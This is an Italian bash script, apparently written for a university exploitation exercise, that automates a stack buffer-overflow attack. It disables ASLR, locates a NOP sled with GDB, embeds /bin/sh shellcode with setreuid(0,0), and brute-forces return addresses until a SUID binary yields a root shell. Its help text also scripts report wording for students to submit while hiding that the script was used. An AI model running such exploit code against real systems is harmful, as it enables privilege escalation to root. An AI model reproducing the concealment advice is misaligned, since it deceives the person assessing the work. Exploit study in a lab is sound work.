#!/bin/bash
#
# exec_shellcode.sh - Ricerca automatica dell'indirizzo di ritorno per exploit
#               di tipo "Buffer Overflow + Shellcode + NOP sled".
#
# Lo script riproduce il ragionamento MANUALE:
#   1. (opzionale) disattiva l'ASLR
#   2. lancia il binario sotto GDB con una sled di soli NOP, fa il dump dello
#      stack, individua il blocco contiguo di 0x90909090 e calcola il CENTRO
#      della sled (cio' che faresti a occhio guardando le colonne di 90)
#   3. prova quel centro sul binario VERO; se manca per lo shift GDB->shell,
#      allarga a VENTAGLIO (centro, +/-4, +/-8, ...) restando nella sled,
#      finche' la sonda conferma il successo. Caso tipico: 1 tentativo.
#
# ---------------------------------------------------------------------------

# ----------------------------- Help ----------------------------------------
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
cat << 'EOF'
NAME
    exec_shellcode.sh - Ricerca dell'indirizzo di ritorno (shellcode + NOP sled)

SYNOPSIS
    ./exec_shellcode.sh [OPZIONI] [./binario] [OFFSET] [SHELLCODE]
    ./exec_shellcode.sh [OPZIONI]        # chiede i parametri mancanti a video

ARGOMENTI POSIZIONALI (opzionali: se ne ometti uno, te lo chiede a video)
    ./binario    Il binario vulnerabile (SUID o no).
    OFFSET       Byte di padding prima dell'indirizzo di ritorno (es. 112).
                 E' l'offset EIP, quello stampato da offset_finder.sh.
    SHELLCODE    Lo shellcode. Due formati accettati, riconosciuti da solo:
                 - formato \x (come il prof):  \x31\xc0\xb0\x46...\x2f\x73\x68
                 - esadecimale continuo:       31c0b046...2f7368

    Il numero di NOP viene calcolato da solo: NOP = OFFSET - lunghezza_shellcode.

    Struttura del payload prodotto:
        [NOP * \x90] + [shellcode] + [indirizzo di ritorno (4 byte, LE)]

OPZIONI
    -s, --stdin
        Invia il payload via STDIN invece che come argomento.
        Per i binari che leggono con gets()/scanf()/read().

    -f, --shellcode-file FILE
        Legge lo shellcode da FILE (formato \x o hex, spazi/newline ignorati).

    -p, --probe "CMD"
        Comando inviato sullo STDIN del binario per capire se la shell e'
        partita. Default: "id".

    -m, --match "STR"
        Stringa cercata nell'output per dichiarare il successo.
        Default: "uid=0" (shell di ROOT da binario SUID).
        Per una shell qualsiasi (binario NON SUID) usa -m "uid=".

    -r, --range N
        Margine extra (byte) oltre i confini della sled, per assorbire lo
        shift GDB->shell quando si allarga a ventaglio. Default: 300.

    -A, --aslr-off
        Esegue 'sudo sysctl -w kernel.randomize_va_space=0' prima di iniziare.

    -h, --help
        Mostra questa guida.

ESEMPI
    # Interattivo:
    ./exec_shellcode.sh

    # Shellcode nel formato del prof, tutti i parametri sulla riga:
    SC='\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
    ./exec_shellcode.sh ./es 112 "$SC"

    # Binario non-SUID (shell del proprio utente): aggiungi -m "uid="
    ./exec_shellcode.sh ./bof 622 "$SC" -m "uid="

REPORT (da inserire a mano, SENZA citare lo script)
    - "Ho lanciato il binario sotto GDB con una sled di soli NOP e, ispezionando
       lo stack al Segmentation Fault con 'x/200xw $esp', ho individuato
       l'intervallo di indirizzi occupato dalla slitta di NOP."
    - "Poiche' l'indirizzo dello stack differisce di pochi byte tra l'ambiente
       di GDB e l'esecuzione diretta (GDB inietta variabili d'ambiente proprie),
       ho mirato al centro della sled e, con pochi tentativi, ho individuato
       l'indirizzo che faceva atterrare il flusso nella slitta, scrivendolo come
       return address in formato Little-Endian."
    - "Il payload ha struttura [NOP][shellcode][return address]: il salto atterra
       nella sled, scorre fino allo shellcode che apre una shell. Essendo il
       binario SUID root, lo shellcode effettua setreuid(0,0) ottenendo una shell
       di root (confermato da 'id')."

    MITIGAZIONE (obbligatoria nel report):
    - "La causa radice e' l'uso di strcpy()/gets() che copia l'input in un buffer
       a dimensione fissa senza controllo di lunghezza. Si corregge con funzioni
       a limite esplicito (strncpy/snprintf/fgets) e validando l'input."
    - "Vanno inoltre riabilitate le protezioni disattivate per l'esercizio: stack
       canary (-fstack-protector), stack non eseguibile/NX (togliendo
       -z execstack) e ASLR. Ciascuna, da sola, vanifica questo exploit."
EOF
exit 0
fi

# --------------------------- Default opzioni -------------------------------
USE_STDIN=false
PROBE="id"
MATCH="uid=0"
HALF_RANGE=300
ASLR_OFF=false
SC_FILE=""

# --------------------------- Parsing argomenti -----------------------------
# Opzioni e posizionali in QUALSIASI ordine.
POS=()
while [ "$#" -gt 0 ]; do
	case "$1" in
		-s|--stdin)          USE_STDIN=true; shift ;;
		-A|--aslr-off)       ASLR_OFF=true;  shift ;;
		-p|--probe)          PROBE="$2";     shift 2 ;;
		-m|--match)          MATCH="$2";     shift 2 ;;
		-r|--range)          HALF_RANGE="$2"; shift 2 ;;
		-f|--shellcode-file) SC_FILE="$2";   shift 2 ;;
		-*) echo "[-] Opzione sconosciuta: $1"; echo "    Usa --help."; exit 1 ;;
		*)  POS+=("$1"); shift ;;
	esac
done
set -- "${POS[@]}"

# Normalizza lo shellcode in hex continuo, accettando "\x31\xc0" o "31c0".
normalize_sc() {
	echo "$1" | sed -e 's/\\x//g' -e 's/0x//g' | tr -d ' \t\r\n,'
}

# --------------------------- Raccolta parametri ----------------------------
# NOP non e' piu' un parametro: lo calcolo da OFFSET - lunghezza_shellcode.
BINARY="$1"
OFFSET="$2"
SC_RAW="$3"

if [ -z "$BINARY" ]; then
	read -r -e -p "Percorso del binario vulnerabile (es. ./es) > " BINARY
fi
if [ -z "$OFFSET" ]; then
	read -r -p "Offset EIP in byte (da offset_finder.sh, es. 112) > " OFFSET
fi

if [ -n "$SC_FILE" ]; then
	SC_HEX=$(normalize_sc "$(cat "$SC_FILE" 2>/dev/null)")
	if [ -z "$SC_HEX" ]; then
		echo "[-] Impossibile leggere lo shellcode da '$SC_FILE'."; exit 1
	fi
elif [ -n "$SC_RAW" ]; then
	SC_HEX=$(normalize_sc "$SC_RAW")
else
	echo "Shellcode (formato \\x31\\xc0... oppure hex continuo 31c0...):"
	read -r -p "  > " SC_RAW
	SC_HEX=$(normalize_sc "$SC_RAW")
fi

# --------------------------- Validazioni -----------------------------------
if [ ! -x "$BINARY" ]; then
	echo "[-] '$BINARY' non esiste o non e' eseguibile."; exit 1
fi
if ! [[ "$OFFSET" =~ ^[0-9]+$ ]]; then
	echo "[-] OFFSET deve essere un numero intero."; exit 1
fi
if ! command -v gdb >/dev/null 2>&1; then
	echo "[-] gdb non trovato nel PATH."; exit 1
fi
if ! [[ "$SC_HEX" =~ ^[0-9a-fA-F]+$ ]] || [ $(( ${#SC_HEX} % 2 )) -ne 0 ]; then
	echo "[-] Shellcode non valido dopo la normalizzazione."
	echo "    Atteso: byte in formato \\xNN oppure hex continuo (lunghezza pari)."
	exit 1
fi
SC_LEN=$(( ${#SC_HEX} / 2 ))

# NOP calcolato da solo: riempie tutto lo spazio prima del return address.
NOP=$(( OFFSET - SC_LEN ))
if [ "$NOP" -lt 0 ]; then
	echo "[-] Lo shellcode ($SC_LEN byte) e' piu' lungo dell'offset ($OFFSET)."
	echo "    Impossibile: non c'e' spazio per i NOP. Controlla offset/shellcode."
	exit 1
fi
echo "[*] NOP calcolati: $NOP  (offset $OFFSET - shellcode $SC_LEN byte)"

# --------------------------- ASLR ------------------------------------------
if [ "$ASLR_OFF" = true ]; then
	echo "[*] Disattivazione ASLR..."
	sudo sysctl -w kernel.randomize_va_space=0 >/dev/null || { echo "[-] sudo fallito."; exit 1; }
fi
ASLR_STATE=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
if [ "$ASLR_STATE" != "0" ]; then
	echo "[!] ASLR risulta ATTIVO (randomize_va_space=$ASLR_STATE). L'exploit sara' instabile."
	echo "    Rilancia con -A, oppure: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
fi

# Prova un singolo indirizzo ($1, DECIMALE). Ritorna 0 se la sonda ha successo.
# Il payload (con null byte nell'indirizzo) e' costruito e lanciato da perl via
# exec, cosi' i null byte sopravvivono (bash li scarterebbe con $(...)).
# ADDR arriva in decimale -> in perl si usa $ENV{ADDR}+0, NON hex().
try_addr() {
	local dec="$1" OUT
	if [ "$USE_STDIN" = true ]; then
		OUT=$( NOP="$NOP" SC="$SC_HEX" ADDR="$dec" PROBE="$PROBE" perl -e '
			my $p = ("\x90" x ($ENV{NOP}+0)) . pack("H*",$ENV{SC}) . pack("V",$ENV{ADDR}+0);
			print $p, "\n", $ENV{PROBE}, "\n";
		' | "$BINARY" 2>/dev/null )
	else
		OUT=$( echo "$PROBE" | \
		       NOP="$NOP" SC="$SC_HEX" ADDR="$dec" BIN="$BINARY" perl -e '
			my $p = ("\x90" x ($ENV{NOP}+0)) . pack("H*",$ENV{SC}) . pack("V",$ENV{ADDR}+0);
			exec $ENV{BIN}, $p or die;
		' 2>/dev/null )
	fi
	echo "$OUT" | grep -qa "$MATCH"
}

# ---------------------------------------------------------------------------
# FASE 1: dump dello stack al crash in GDB, individua il blocco di NOP, centro.
# ---------------------------------------------------------------------------
echo "[*] Fase 1: individuo la NOP sled nello stack tramite GDB..."
NOP_TOTAL=$(( OFFSET + 4 ))

if [ "$USE_STDIN" = true ]; then
	RUNLINE="run < <(perl -e 'print \"\\x90\"x$NOP_TOTAL')"
else
	RUNLINE="run \$(perl -e 'print \"\\x90\"x$NOP_TOTAL')"
fi

GDB_OUT=$(gdb -q -batch \
	-ex "set pagination off" \
	-ex "$RUNLINE" \
	-ex "x/400xw \$esp-400" \
	"$BINARY" 2>/dev/null)

read SLED_START SLED_END < <(awk '
	/^0x[0-9a-fA-F]+:/ {
		base = strtonum($1)
		for (i = 2; i <= NF; i++) {
			addr = base + (i-2)*4
			if ($i == "0x90909090") {
				if (run_len == 0) run_start = addr
				run_len++
				run_end = addr
				if (run_len > best_len) {
					best_len = run_len; best_start = run_start; best_end = run_end
				}
			} else {
				run_len = 0
			}
		}
	}
	END {
		if (best_len > 0) printf "%d %d\n", best_start, best_end
	}
' <<< "$GDB_OUT")

if [ -z "$SLED_START" ] || [ -z "$SLED_END" ]; then
	echo "[-] Non ho trovato la NOP sled nel dump di GDB. Il binario e' andato in crash?"
	echo "    Output grezzo di GDB (prime righe):"
	echo "$GDB_OUT" | head -n 20 | sed 's/^/      /'
	exit 1
fi

SLED_MID=$(( (SLED_START + SLED_END) / 2 ))
SLED_MID=$(( SLED_MID - (SLED_MID % 4) ))
SLED_BYTES=$(( SLED_END - SLED_START + 4 ))

echo "[+] Sled individuata in GDB: $(printf 0x%x $SLED_START) -> $(printf 0x%x $SLED_END) (~$SLED_BYTES byte)"
echo "[+] Centro della sled (primo tentativo): $(printf 0x%x $SLED_MID)"

# ---------------------------------------------------------------------------
# FASE 2: prova il centro; se manca, allarga a ventaglio restando nella sled.
# ---------------------------------------------------------------------------
echo "--------------------------------------------------"
echo "[*] Fase 2: provo il centro, poi allargo a ventaglio se serve."
echo "    Sonda: '$PROBE' | match su '$MATCH'"
echo "--------------------------------------------------"

FOUND=""
SPAN=$(( (SLED_BYTES / 2) + HALF_RANGE ))

for (( step=0; step<=SPAN; step+=4 )); do
	for sign in + -; do
		[ "$step" -eq 0 ] && [ "$sign" = "-" ] && continue
		addr=$(( SLED_MID ${sign} step ))
		printf "\rTesting ret = 0x%x " "$addr"
		if try_addr "$addr"; then
			FOUND="$addr"; break 2
		fi
	done
done
echo ""

echo "--------------------------------------------------"
if [ -n "$FOUND" ]; then
	HEX=$(printf "0x%x" "$FOUND")
	b0=$(printf '\\x%02x' $(( FOUND        & 0xff )))
	b1=$(printf '\\x%02x' $(( (FOUND >> 8)  & 0xff )))
	b2=$(printf '\\x%02x' $(( (FOUND >> 16) & 0xff )))
	b3=$(printf '\\x%02x' $(( (FOUND >> 24) & 0xff )))
	LE="${b0}${b1}${b2}${b3}"

	SC_BS=$(echo "$SC_HEX" | sed 's/\(..\)/\\x\1/g')

	echo "[+] TROVATO! Return address funzionante: $HEX"
	echo "[+] Little-endian da iniettare: $LE"
	echo ""
	echo "[*] Comando per la shell INTERATTIVA (da copiare e incollare):"
	echo ""
	if [ "$USE_STDIN" = true ]; then
		echo "    { perl -e 'print \"\\x90\"x$NOP . \"$SC_BS\" . \"$LE\"'; cat; } | $BINARY"
	else
		echo "    perl -e 'exec \"$BINARY\", \"\\x90\"x$NOP . \"$SC_BS\" . \"$LE\"'"
		echo ""
		echo "    (La forma classica  $BINARY \$(perl -e '...')  NON va qui: l'indirizzo"
		echo "     $HEX contiene un null byte e verrebbe troncato dalla shell. Con 'exec'"
		echo "     e' perl stesso a lanciare il binario, quindi i null byte sopravvivono.)"
	fi
	echo ""
	echo "[i] Suggerimento: per robustezza fra lanci diversi, mira al CENTRO della"
	echo "    sled, non ai bordi (un indirizzo qualche byte piu' avanti di questo)."
else
	echo "[-] Nessun indirizzo valido nella finestra +/- $HALF_RANGE."
	echo "    Prova ad allargarla con -r (es. -r 600), o verifica shellcode/offset/NOP."
	echo "    Se cerchi una shell non-root, ricorda -m \"uid=\" invece del default uid=0."
fi
